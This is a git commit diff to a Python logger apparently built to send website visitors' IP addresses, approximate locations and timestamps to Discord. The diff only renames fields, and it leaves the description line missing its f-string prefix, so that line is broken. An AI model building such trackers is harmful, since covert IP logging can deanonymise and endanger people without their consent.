36cbab222d0f66c0dcc96864ce4a6d5e4d21ee51
itsnotfridayet <jacedill@outlook.com>
2025-07-16 23:24:39 -0600

    Changed some formattting

--- logger.py
+++ logger.py
@@ -29,10 +29,10 @@ def send_ip_to_discord(ip, data):
 
     embed = {
         "title": "New Visitor",
-        "description": "IP Address: " + ip,
+        "description": "IP Address: `{ip}`",
         "color": 65280,  # green
         "fields": [
-            {"name": "IP Address", "value": f"{data['location']['city']}, {data['location']['region']}, {data['location']['country']} {data['flag']['emoji']}", "inline": False},
+            {"name": "Approximate Location", "value": f"{data['location']['city']}, {data['location']['region']}, {data['location']['country']} {data['flag']['emoji']}", "inline": False},
             {"name": "Timestamp", "value": current_time.strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
         ]
     }
